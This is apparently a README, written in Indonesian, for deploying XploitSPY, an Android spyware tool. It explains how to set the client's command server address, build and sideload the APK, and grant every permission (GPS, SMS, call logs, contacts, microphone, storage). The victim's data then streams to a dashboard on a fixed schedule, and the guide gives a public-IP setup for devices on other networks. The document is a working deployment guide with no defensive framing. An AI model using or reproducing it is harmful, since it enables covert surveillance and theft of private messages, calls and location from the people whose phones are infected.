# Cara Monitoring Device dengan XploitSPY

## 🔍 Kenapa Dashboard Kosong?

Dashboard menampilkan **"Tidak ada perangkat yang terhubung"** karena:
- ✅ Server sudah berjalan dengan baik
- ❌ Belum ada Android client yang terinstall
- ❌ Android client belum dikonfigurasi dengan IP server
- ❌ Android client belum terhubung ke server

## 📱 Langkah-langkah Setup Android Client

### Step 1: Dapatkan IP Server Anda

IP server Anda: **`10.254.103.119`**

Server berjalan di port: **`3000`**

Jadi URL server: `http://10.254.103.119:3000`

### Step 2: Konfigurasi Android Client

#### Opsi A: Menggunakan Quick Config (Paling Mudah)

```bash
cd builder
./quick_config.sh
```

Script akan:
- Auto-detect IP server
- Update file Config.java otomatis
- Memberikan instruksi build APK

#### Opsi B: Manual Update Config

Edit file: `client/app/src/main/java/com/xploitspy/client/Config.java`

```java
public class Config {
    public static final String SERVER_URL = "http://10.254.103.119:3000";
    public static final String SOCKET_URL = "http://10.254.103.119:3000";
    // ...
}
```

### Step 3: Build APK

#### Menggunakan Android Studio (Recommended)

1. **Install Android Studio** (jika belum)
   - Download: https://developer.android.com/studio

2. **Open Project**
   - Buka Android Studio
   - File → Open → Pilih folder `client/`
   - Tunggu Gradle sync selesai

3. **Build APK**
   - Build → Build Bundle(s) / APK(s) → Build APK(s)
   - Tunggu build selesai
   - APK akan tersedia di: `app/build/outputs/apk/release/app-release.apk`

#### Menggunakan Command Line

```bash
cd client

# Pastikan Android SDK terinstall
export ANDROID_HOME=$HOME/Android/Sdk
export PATH=$PATH:$ANDROID_HOME/tools
export PATH=$PATH:$ANDROID_HOME/platform-tools

# Build APK
./gradlew assembleRelease

# APK akan tersedia di:
# app/build/outputs/apk/release/app-release.apk
```

### Step 4: Install APK di Android Device

1. **Transfer APK ke Android Device**
   - Via USB: Copy APK ke device
   - Via Email: Kirim APK ke email, buka di device
   - Via Cloud: Upload ke Google Drive/Dropbox, download di device

2. **Enable Unknown Sources**
   - Settings → Security → Unknown Sources (aktifkan)
   - Atau Settings → Apps → Special Access → Install Unknown Apps

3. **Install APK**
   - Buka file APK di device
   - Tap "Install"
   - Tunggu proses install selesai

4. **Berikan Permissions**
   Saat pertama kali buka, aplikasi akan meminta permissions:
   - ✅ Location (GPS)
   - ✅ Contacts
   - ✅ SMS (Read & Send)
   - ✅ Phone (Call logs)
   - ✅ Storage
   - ✅ Microphone
   - ✅ dll
   
   **PENTING:** Berikan semua permissions yang diminta!

### Step 5: Verifikasi Koneksi

1. **Buka Dashboard**
   - Buka browser: `http://10.254.103.119:3000`
   - Login dengan: `admin` / `password`

2. **Refresh Dashboard**
   - Klik tombol "Refresh"
   - Atau refresh browser (F5)

3. **Device Seharusnya Muncul**
   - Device akan muncul di daftar "Connected Devices"
   - Klik "View" untuk melihat detail device

4. **Data Akan Muncul Secara Real-time**
   - GPS logs akan muncul setiap 30 detik
   - SMS logs akan muncul setiap 60 detik
   - Call logs akan muncul setiap 60 detik
   - dll

## 🔧 Troubleshooting

### Device Tidak Muncul di Dashboard

**1. Cek Koneksi Internet**
```bash
# Test dari Android device
# Buka browser di Android, akses:
http://10.254.103.119:3000
```
- Harus bisa akses dashboard
- Jika tidak bisa, cek:
  - Device dan server dalam WiFi yang sama?
  - Firewall tidak block port 3000?
  - IP server benar?

**2. Cek Server Logs**
```bash
cd server
npm run pm2:logs
```
Lihat apakah ada koneksi dari device atau error.

**3. Cek Config.java**
Pastikan IP dan port benar:
```java
SERVER_URL = "http://10.254.103.119:3000"  // Bukan localhost!
```

**4. Restart Aplikasi Android**
- Force stop aplikasi
- Buka lagi aplikasi
- Cek apakah service berjalan

### Data Tidak Muncul

**1. Cek Permissions**
- Settings → Apps → XploitSPY → Permissions
- Pastikan semua permissions aktif

**2. Cek Logs Android**
```bash
# Jika device terhubung via USB
adb logcat | grep XploitSPY
```

**3. Tunggu Beberapa Detik**
- GPS: setiap 30 detik
- SMS: setiap 60 detik
- Calls: setiap 60 detik
- Contacts: setiap 5 menit
- Apps: setiap 10 menit

### Build APK Error

**1. Android SDK Tidak Ditemukan**
```bash
export ANDROID_HOME=$HOME/Android/Sdk
export PATH=$PATH:$ANDROID_HOME/tools
export PATH=$PATH:$ANDROID_HOME/platform-tools
```

**2. Gradle Error**
```bash
cd client
./gradlew clean
./gradlew assembleRelease
```

## 📋 Checklist Setup

- [ ] IP server sudah diketahui: `10.254.103.119:3000`
- [ ] Config.java sudah diupdate dengan IP server
- [ ] APK sudah di-build
- [ ] APK sudah diinstall di Android device
- [ ] Semua permissions sudah diberikan
- [ ] Device dan server dalam jaringan yang sama
- [ ] Dashboard bisa diakses dari device
- [ ] Device muncul di dashboard
- [ ] Data mulai muncul

## 🎯 Quick Test

Setelah install APK di Android:

1. **Test Koneksi:**
   - Buka browser di Android
   - Akses: `http://10.254.103.119:3000`
   - Harus bisa login

2. **Cek Dashboard:**
   - Refresh dashboard di browser
   - Device harus muncul

3. **Cek Logs:**
   ```bash
   cd server
   npm run pm2:logs
   ```
   Harus ada log "Device registered"

## 💡 Tips

1. **Untuk Testing:** Gunakan Android Emulator
   - Install Android Studio
   - Buat AVD (Android Virtual Device)
   - Install APK di emulator

2. **Untuk Production:** 
   - Gunakan IP publik jika device berbeda network
   - Setup HTTPS untuk security
   - Gunakan domain name

3. **Monitoring:**
   - Dashboard update real-time via WebSocket
   - Data tersimpan di database SQLite
   - Bisa export data jika diperlukan

## 📞 Butuh Bantuan?

Jika masih ada masalah:
1. Cek logs server: `npm run pm2:logs`
2. Cek logs Android: `adb logcat | grep XploitSPY`
3. Pastikan semua step diikuti dengan benar

